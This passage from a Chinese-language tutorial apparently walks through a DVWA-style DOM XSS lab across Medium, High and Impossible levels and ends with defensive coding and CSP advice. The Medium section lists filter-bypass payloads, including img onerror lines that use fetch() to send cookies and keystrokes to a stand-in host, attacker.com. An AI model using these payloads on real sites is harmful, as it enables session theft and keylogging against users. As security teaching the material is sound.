class="line"><span class="language-javascript">    <span class="comment">// .*? - 匹配任意内容（非贪婪）</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// &lt;\/script&gt; - 匹配</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>结束标签</span><br><span class="line">    // g - 全局匹配</span><br><span class="line">    // i - 忽略大小写</span><br><span class="line">    //</span><br><span class="line">    // 问题：</span><br><span class="line">    // 1. 只过滤<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">标签</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 2. 不过滤&lt;img&gt;、&lt;svg&gt;等其他标签</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 3. 不过滤事件处理器（onerror、onload等）</span></span></span><br><span class="line"><span class="language-javascript">    langDefault = langDefault.<span class="title function_">replace</span>(<span class="regexp">/&lt;script[^&gt;]*&gt;.*?&lt;\/script&gt;/gi</span>, <span class="string">&#x27;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 仍使用document.write()输出</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option&gt;Welcome to &quot;</span> + langDefault + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="property">default</span>.<span class="property">value</span> = langDefault;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="新增防护"><a href="#新增防护" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
<li><strong>正则过滤<script>标签</strong> - 移除<code>&lt;script&gt;...&lt;/script&gt;</code></li>
<li><strong>忽略大小写</strong> - 防止<code>&lt;ScRiPt&gt;</code>绕过</li>
</ol>
<h3 id="仍存在的漏洞"><a href="#仍存在的漏洞" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>核心问题：</strong></p>
<p>只过滤<code>&lt;script&gt;</code>标签，但有很多其他方式可以执行JavaScript：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 被过滤 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 仍然有效 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：使用标签"><a href="#方法1：使用标签" class="headerlink" title="方法1：使用标签"></a>方法1：使用<img>标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>原理：</strong></p>
<ul>
<li><code>&lt;img&gt;</code>标签不在过滤列表中</li>
<li><code>onerror</code>事件处理器可以执行JavaScript</li>
<li><code>src=x</code>会加载失败，触发onerror</li>
</ul>
<h4 id="方法2：使用标签"><a href="#方法2：使用标签" class="headerlink" title="方法2：使用标签"></a>方法2：使用<svg>标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=<span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="方法3：使用"><a href="#方法3：使用" class="headerlink" title="方法3：使用"></a>方法3：使用<iframe></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="方法4：使用"><a href="#方法4：使用" class="headerlink" title="方法4：使用"></a>方法4：使用<body></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=<span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="方法5：使用事件处理器组合"><a href="#方法5：使用事件处理器组合" class="headerlink" title="方法5：使用事件处理器组合"></a>方法5：使用事件处理器组合</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 窃取Cookie --&gt;</span></span><br><span class="line">?default=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;fetch(&#x27;http://attacker.com/?c=&#x27;+document.cookie)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 键盘记录 --&gt;</span></span><br><span class="line">?default=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;document.onkeypress=e=&gt;fetch(&#x27;http://attacker.com/?k=&#x27;+e.key)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="High-难度"><a href="#High-难度" class="headerlink" title="High 难度"></a>High 难度</h2><h3 id="攻击目标-2"><a href="#攻击目标-2" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>更严格的白名单过滤，但仍可能绕过。</p>
<h3 id="前端代码分析-2"><a href="#前端代码分析-2" class="headerlink" title="前端代码分析"></a>前端代码分析</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> langDefault = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) + <span class="number">8</span></span></span><br><span class="line"><span class="language-javascript">    );</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// ★★★ 新增：白名单验证 ★★★</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 定义允许的语言列表</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 使用switch-case进行严格匹配</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 作用：只允许预定义的值</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 任何不在列表中的值都会被拒绝</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">switch</span> (langDefault) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 在白名单中，允许输出</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option&gt;Welcome to &quot;</span> + langDefault + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">default</span>:</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// ★★★ 问题：默认情况仍会输出 ★★★</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 虽然检查了白名单，但default分支仍使用document.write()</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 如果这里有任何输出，仍可能存在XSS</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option&gt;Invalid selection&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="property">default</span>.<span class="property">value</span> = langDefault;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="新增防护-1"><a href="#新增防护-1" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
<li><strong>白名单验证</strong> - 只允许特定的语言名称</li>
<li><strong>Switch-case严格匹配</strong> - 完全相等才允许</li>
</ol>
<h3 id="仍存在的漏洞-1"><a href="#仍存在的漏洞-1" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>关键问题：</strong></p>
<p>虽然使用了白名单，但代码实现可能存在逻辑漏洞：</p>
<ol>
<li><strong>default分支的处理</strong> - 如果default分支有输出，可能被利用</li>
<li><strong>大小写敏感</strong> - switch是严格匹配，但没有统一转换大小写</li>
<li><strong>编码绕过</strong> - URL编码、Unicode编码可能绕过检查</li>
</ol>
<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：利用default分支（如果存在漏洞）"><a href="#方法1：利用default分支（如果存在漏洞）" class="headerlink" title="方法1：利用default分支（如果存在漏洞）"></a>方法1：利用default分支（如果存在漏洞）</h4><p>如果default分支代码是：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">default</span>:</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option&gt;You selected: &quot;</span> + langDefault + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>那么仍可注入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="方法2：大小写混淆（无效）"><a href="#方法2：大小写混淆（无效）" class="headerlink" title="方法2：大小写混淆（无效）"></a>方法2：大小写混淆（无效）</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- switch是严格匹配，这个无效 --&gt;</span></span><br><span class="line">?default=ENGLISH  ✗</span><br><span class="line">?default=english  ✗</span><br></pre></td></tr></table></figure>

<h4 id="方法3：URL编码（可能有效）"><a href="#方法3：URL编码（可能有效）" class="headerlink" title="方法3：URL编码（可能有效）"></a>方法3：URL编码（可能有效）</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 如果substring后没有解码，可能绕过 --&gt;</span></span><br><span class="line">?default=%3Cscript%3Ealert(1)%3C/script%3E</span><br></pre></td></tr></table></figure>

<p><strong>High难度通常无法绕过，除非实现有缺陷。</strong></p>
<hr>
<h2 id="Impossible-难度"><a href="#Impossible-难度" class="headerlink" title="Impossible 难度"></a>Impossible 难度</h2><h3 id="攻击目标-3"><a href="#攻击目标-3" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>完善的防御机制，真正安全。</p>
<h3 id="前端代码分析-3"><a href="#前端代码分析-3" class="headerlink" title="前端代码分析"></a>前端代码分析</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// ★★★ 核心改进：不直接使用URL参数 ★★★</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 方法1：完全避免使用URL参数</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 使用服务器端验证和渲染</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// JavaScript只处理用户交互，不处理URL参数</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 方法2：严格的输入验证和输出编码</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> langDefault = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) + <span class="number">8</span></span></span><br><span class="line"><span class="language-javascript">    );</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// ★★★ 改进1：URL解码 ★★★</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// decodeURIComponent() - 解码URL编码</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 防止编码绕过</span></span></span><br><span class="line"><span class="language-javascript">    langDefault = <span class="built_in">decodeURIComponent</span>(langDefault);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// ★★★ 改进2：严格的白名单 ★★★</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> allowedLanguages = &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="string">&#x27;English&#x27;</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="string">&#x27;French&#x27;</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="string">&#x27;Spanish&#x27;</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="string">&#x27;German&#x27;</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// ★★★ 改进3：白名单检查 ★★★</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (allowedLanguages[langDefault]) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// ★★★ 改进4：使用textContent而不是innerHTML ★★★</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// textContent - 只设置文本内容，不解析HTML</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 即使有HTML标签，也会作为纯文本显示</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> option = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;option&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        option.<span class="property">textContent</span> = <span class="string">&quot;Welcome to &quot;</span> + langDefault;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;select&#x27;</span>).<span class="title function_">appendChild</span>(option);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="property">default</span>.<span class="property">value</span> = langDefault;</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 无效输入，显示错误</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> option = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;option&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        option.<span class="property">textContent</span> = <span class="string">&quot;Invalid selection&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;select&#x27;</span>).<span class="title function_">appendChild</span>(option);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// ★★★ 最佳方案：完全避免DOM型XSS ★★★</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 1. 不从URL读取敏感数据</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 2. 使用服务器端渲染</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 3. 实施CSP（Content Security Policy）</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="完善的防护机制"><a href="#完善的防护机制" class="headerlink" title="完善的防护机制"></a>完善的防护机制</h3><p><strong>多层防御：</strong></p>
<ol>
<li><strong>白名单验证</strong> - 只允许预定义的值</li>
<li><strong>URL解码</strong> - 防止编码绕过</li>
<li><strong>使用textContent</strong> - 不解析HTML</li>
<li><strong>createElement + appendChild</strong> - 安全的DOM操作</li>
<li><strong>避免危险函数</strong> - 不使用innerHTML、document.write()</li>
</ol>
<p><strong>安全的DOM操作：</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 危险 ✗</span></span><br><span class="line">element.<span class="property">innerHTML</span> = userInput;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(userInput);</span><br><span class="line"><span class="built_in">eval</span>(userInput);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 安全 ✓</span></span><br><span class="line">element.<span class="property">textContent</span> = userInput;</span><br><span class="line">element.<span class="title function_">setAttribute</span>(<span class="string">&#x27;data-value&#x27;</span>, userInput);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(userInput);</span><br></pre></td></tr></table></figure>

<h3 id="为什么无法攻破？"><a href="#为什么无法攻破？" class="headerlink" title="为什么无法攻破？"></a>为什么无法攻破？</h3><p><strong>所有攻击都被阻止：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">攻击1：?<span class="attribute">default</span>=&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">白名单检查 → 失败（不在列表中）</span><br><span class="line">结果：显示<span class="string">&quot;Invalid selection&quot;</span></span><br><span class="line"></span><br><span class="line">攻击2：?<span class="attribute">default</span>=&lt;img <span class="attribute">src</span>=x <span class="attribute">onerror</span>=alert(1)&gt;</span><br><span class="line">白名单检查 → 失败</span><br><span class="line">结果：显示<span class="string">&quot;Invalid selection&quot;</span></span><br><span class="line"></span><br><span class="line">攻击3：?<span class="attribute">default</span>=English&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">白名单检查 → 失败（完全匹配）</span><br><span class="line">结果：显示<span class="string">&quot;Invalid selection&quot;</span></span><br><span class="line"></span><br><span class="line">攻击4：?<span class="attribute">default</span>=English</span><br><span class="line">白名单检查 → 通过</span><br><span class="line">输出方式 → textContent（纯文本）</span><br><span class="line">结果：即使值被修改，也不会执行脚本</span><br></pre></td></tr></table></figure>

<p><strong>关键防御点：</strong></p>
<ol>
<li><strong>Source控制</strong> - URL参数经过严格验证</li>
<li><strong>Sink安全</strong> - 使用textContent而不是innerHTML</li>
<li><strong>白名单机制</strong> - 默认拒绝策略</li>
<li><strong>无解析点</strong> - 没有地方会解析HTML</li>
</ol>
<hr>
<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h3><h4 id="1-避免危险的Sinks"><a href="#1-避免危险的Sinks" class="headerlink" title="1. 避免危险的Sinks"></a>1. 避免危险的Sinks</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 危险 ✗</span></span><br><span class="line">element.<span class="property">innerHTML</span> = userInput;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(userInput);</span><br><span class="line"><span class="built_in">eval</span>(userInput);</span><br><span class="line"><span class="built_in">setTimeout</span>(userInput, <span class="number">1000</span>);</span><br><span class="line">element.<span class="title function_">setAttribute</span>(<span class="string">&#x27;onclick&#x27;</span>, userInput);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 安全 ✓</span></span><br><span class="line">element.<span class="property">textContent</span> = userInput;</span><br><span class="line">element.<span class="title function_">setAttribute</span>(<span class="string">&#x27;data-value&#x27;</span>, userInput);</span><br><span class="line"><span class="keyword">var</span> text = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(userInput);</span><br><span class="line">element.<span class="title function_">appendChild</span>(text);</span><br></pre></td></tr></table></figure>

<h4 id="2-验证和清理输入"><a href="#2-验证和清理输入" class="headerlink" title="2. 验证和清理输入"></a>2. 验证和清理输入</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 白名单验证</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isValidLanguage</span>(<span class="params">lang</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> allowed = [<span class="string">&#x27;English&#x27;</span>, <span class="string">&#x27;French&#x27;</span>, <span class="string">&#x27;Spanish&#x27;</span>, <span class="string">&#x27;German&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> allowed.<span class="title function_">includes</span>(lang);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// URL解码</span></span><br><span class="line"><span class="keyword">var</span> input = <span class="built_in">decodeURIComponent</span>(userInput);</span><br><span class="line"></span><br><span class="line"><span class="comment">// HTML编码</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">escapeHtml</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">    div.<span class="property">textContent</span> = str;</span><br><span class="line">    <span class="keyword">return</span> div.<span class="property">innerHTML</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-使用安全的API"><a href="#3-使用安全的API" class="headerlink" title="3. 使用安全的API"></a>3. 使用安全的API</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用textContent</span></span><br><span class="line">element.<span class="property">textContent</span> = userInput;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用createElement</span></span><br><span class="line"><span class="keyword">var</span> option = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;option&#x27;</span>);</span><br><span class="line">option.<span class="property">textContent</span> = userInput;</span><br><span class="line">select.<span class="title function_">appendChild</span>(option);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用setAttribute（对于数据属性）</span></span><br><span class="line">element.<span class="title function_">setAttribute</span>(<span class="string">&#x27;data-value&#x27;</span>, userInput);</span><br></pre></td></tr></table></figure>

<h4 id="4-实施内容安全策略（CSP）"><a href="#4-实施内容安全策略（CSP）" class="headerlink" title="4. 实施内容安全策略（CSP）"></a>4. 实施内容安全策略（CSP）</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 在HTML头部添加 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;; object-src &#x27;none&#x27;;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 或在HTTP响应头 --&gt;</span></span><br><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27; &#x27;nonce-&#123;random&#125;&#x27;; object-src &#x27;none&#x27;;</span><br></pre></td></tr></table></figure>

